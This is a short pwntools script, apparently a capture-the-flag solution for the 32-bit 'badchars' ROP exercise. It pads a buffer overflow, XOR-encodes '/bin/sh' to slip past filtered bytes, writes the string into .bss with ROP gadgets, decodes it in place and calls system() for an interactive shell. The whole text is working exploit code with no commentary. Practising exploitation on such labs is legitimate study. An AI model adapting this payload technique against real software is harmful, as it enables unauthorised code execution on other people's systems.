from pwn import *

p = process('./badchars32')

pop_ebx_ecx = 0x08048896
pop_esi_edi = 0x08048899
mov_edi_esi = 0x08048893
xor_ebx_cl = 0x08048890
system_plt = 0x080484E0
bss_addr = 0x0804A040
pad = 'A'*44

badchars = [98,105,99,47,32,102,110,115]
xor_byte = 1
while 1:
	binsh = ''
	for i in '/bin/sh\x00':
		a = ord(i) ^ xor_byte
		if a in badchars:
			xor_byte += 1
			break
		else:
			binsh += chr(a)
	if len(binsh) == 8:
		break
		
payload = pad
payload += p32(pop_esi_edi)
payload += binsh[:4]
payload += p32(bss_addr)
payload += p32(mov_edi_esi)
payload += p32(pop_esi_edi)
payload += binsh[4:8]
payload += p32(bss_addr+4)
payload += p32(mov_edi_esi)

for i in range(len(binsh)):
	payload += p32(pop_ebx_ecx)
	payload += p32(bss_addr+i)
	payload += p32(xor_byte)
	payload += p32(xor_ebx_cl)
	
payload += p32(system_plt)
payload += 'BBBB'
payload += p32(bss_addr)

p.sendline(payload)
p.interactive()
